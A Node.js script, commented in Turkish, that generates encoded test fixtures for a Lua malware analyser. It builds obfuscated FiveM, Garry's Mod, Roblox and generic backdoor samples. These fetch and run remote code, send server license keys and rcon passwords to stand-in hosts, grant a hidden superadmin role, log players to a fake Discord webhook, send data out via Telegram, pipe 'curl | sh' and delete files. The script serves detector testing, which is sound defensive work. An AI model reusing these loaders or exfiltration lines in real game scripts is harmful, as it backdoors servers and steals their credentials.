// Analiz raporu fixture'larını üretir: node scripts/make-analyze-fixtures.js
// Örnekler diske yalnızca XOR + base64 (.lua.x) olarak yazılır ve testlerde yalnızca bellekte çözülür
// (test/fixture-codec.js): arka kapı/logger benzeri test örnekleri antivirüsü tetiklemesin. Ham örnek hiçbir zaman
// diske yazılmaz; şüpheli dizgeler bu betikte parçalı yazılır. Adresler belge/örnek aralıklarındandır (203.0.113.0/24,
// 198.51.100.0/24, .example); webhook ve bot token'ları uydurmadır.
import { writeFileSync, mkdirSync, readdirSync, rmSync } from 'node:fs';
import { encodeFixture } from '../test/fixture-codec.js';

const dir = new URL('../test/analyze-fixtures/', import.meta.url);
mkdirSync(dir, { recursive: true });
for (const f of readdirSync(dir)) if (f.endsWith('.x')) rmSync(new URL(f, dir));

const j = (...p) => p.join('');
const PHR = j('Perform', 'Http', 'Request');
const RUN = j('Run', 'String');
const LS = j('load', 'string');
const EXEC = j('os.', 'exe', 'cute');
const POPEN = j('io.', 'po', 'pen');
const HOOK = j('https://discord.com/api/', 'web', 'hooks/', '1234567890/', 'peelTEST-token_x');
const TG = j('https://api.', 'telegram.org/', 'bot', '123456789:', 'A'.repeat(35), '/send', 'Message?chat_id=-1001234567');
const PANEL = j('https://cipher', '-panel', '.me/_i/i?to=peel');
const bytes = (s) => [...Buffer.from(s)].join(', ');
const dec = (s) => [...Buffer.from(s)].map((x) => `\\${x}`).join('');
const fx = {};

// FiveM: yük string.char döngüsüyle kurulup load ile açılır (sandbox katmanı); içinde uzaktan kod + anahtar sızdırma
fx['fivem-backdoor'] = `local p = { ${bytes([
  `RegisterNetEvent('help${'Code'}')`,
  `${PHR}('${PANEL}', function(e, d) if d then pcall(function() assert(load(d))() end) end end, 'GET')`,
  `local k = GetConvar('${j('sv_license', 'Key')}', '') .. GetConvar('${j('rcon_', 'password')}', '')`,
  `${PHR}('https://collect.peel-test.example/k', function() end, 'POST', k)`,
].join('\n'))} }
local s = ''
for i = 1, #p do s = s .. string.char(p[i]) end
${LS}(s)()
`;

// Garry's Mod: ondalık kaçışlı loadstring katmanı; uzaktan kod, net mesajıyla kod ve gizli superadmin
fx['gmod-backdoor'] = `${LS}("${dec([
  `http.Fetch('http://203.0.113.5/p.lua', function(b) ${RUN}(b) end)`,
  `net.Receive('peel_x', function() ${RUN}(net.ReadString()) end)`,
  `hook.Add('PlayerInitialSpawn', 'peel', function(ply) ply:${j('SetUser', 'Group')}('super${'admin'}') end)`,
].join('\n'))}")()
`;

// Roblox: uzaktan yükleme, webhook logger, require(<varlık>) arka kapısı; roblox.com API'si zararsız sayılmalı
fx['roblox-logger'] = `${LS}(game:HttpGet('https://pastebin.com/raw/PeelAb12'))()
local hs = game:GetService('HttpService')
local plr = game.Players.LocalPlayer
hs:PostAsync('${HOOK}', hs:JSONEncode({ content = tostring(plr.Name) .. ' ' .. tostring(plr.UserId) }))
print(game:HttpGet('https://users.roblox.com/v1/users/1'))
local m = require(${j('4567', '891230')})
`;

// Genel: ters çevrilmiş loadstring katmanı; komut, dosya silme, Telegram'a sızdırma
const generic = [
  `${EXEC}('${j('cu', 'rl')} -s http://198.51.100.9/x.sh | sh')`,
  `local h = ${POPEN}('whoami')`,
  `os.remove('peel-data.db')`,
  `local u = '${TG}'`,
  'print(#u)',
].join('\n');
fx.generic = `local z = [=[${[...generic].reverse().join('')}]=]
${LS}(z:reverse())()
`;

for (const [name, src] of Object.entries(fx)) writeFileSync(new URL(`${name}.lua.x`, dir), encodeFixture(Buffer.from(src)));
console.log(`${Object.keys(fx).length} analiz fixture'ı yazıldı`);
